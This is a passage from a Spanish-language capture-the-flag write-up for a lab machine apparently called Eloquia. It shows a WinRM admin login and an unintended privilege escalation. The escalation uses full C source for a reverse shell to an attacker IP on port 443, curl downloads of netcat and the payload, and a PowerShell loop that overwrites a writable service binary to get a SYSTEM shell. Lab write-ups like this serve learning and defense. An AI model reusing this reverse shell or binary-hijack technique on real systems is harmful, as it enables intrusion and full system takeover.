WINRM       10.129.244.81   5985   ELOQUIA          [*] Windows 10 / Server 2019 Build 17763 (name:ELOQUIA) (domain:Eloquia) 
WINRM       10.129.244.81   5985   ELOQUIA          [+] Eloquia\Administrator:Password123! (admin)
```


## Root Time

Ahora solamente nos quedaría conectarnos por WinRM y leer la flag

``` bash
evil-winrm-py -i "$TARGET_IP" -u Administrator -p 'Password123!' 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to '10.129.244.81:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
e22...
```


## (Unintended) File Overwrite

Con el comando `icacls` podemos ver que `olivia.kat` posee permisos de escritura sobre `Failure2Ban.exe`

``` bash
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe ELOQUIA\Olivia.KAT:(I)(RX,W)
                                                                                                   NT AUTHORITY\SYSTEM:(I)(F)
                                                                                                   BUILTIN\Administrators:(I)(F)
                                                                                                   BUILTIN\Users:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

> Podemos aprovechar los permisos de escritura con `olivia.kat` para sobrescribir el binario y ejecutar uno malicioso. 
{: .notice--warning}

El siguiente código C iniciará una conexión hacia nuestra máquina usando `netcat` por el puerto `443`

``` c
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

int main(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    struct sockaddr_in addr = { 0 };
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(443);
    addr.sin_addr.s_addr = inet_addr("10.10.15.242");

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA si = { 0 };
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = si.hStdOutput = si.hStdError = (HANDLE)s;

    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, "cmd.exe", NULL, NULL,
                   TRUE,               
                   0, NULL, NULL, &si, &pi);

    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
```

Compilaremos un `.exe` con el mismo nombre y las siguientes flags

``` bash
x86_64-w64-mingw32-gcc main.c -o Failure2Ban.exe -mwindows -static -lws2_32
```

Descargaremos `netcat` y nuestro binario malicioso `Failure2Ban.exe` en la máquina víctima

``` powershell
evil-winrm-py PS C:\Programdata> curl http://10.10.15.242/nc64.exe -o nc64.exe
evil-winrm-py PS C:\Programdata> curl http://10.10.15.242/Failure2Ban.exe -o Failure2Ban.exe
```

Ahora copiaremos el binario en la carpeta donde lo vimos originalmente. En este caso usaremos un `loop` porque de lo contrario obtendremos un mensaje de error

``` powershell
evil-winrm-py PS C:\Programdata> $dst = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
evil-winrm-py PS C:\Programdata> for ($i=0; $i -lt 600; $i++) { try { Copy-Item C:\Programdata\Failure2Ban.exe $dst -Force -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 50 } }
```

Al cabo de unos momentos recibiremos una consola como `nt authority/system`

``` bash
rlwrap nc -lvnp 443  
Connection from 10.10.11.99:54694
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Ya podremos ver la última flag del sistema ubicada en el escritorio del usuario `Administrator`

``` bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ed2...
```

Gracias por leer, a continuación te dejo la cita del día.

> Silence is a true friend who never betrays.
> — Confucius
{: .notice--info}
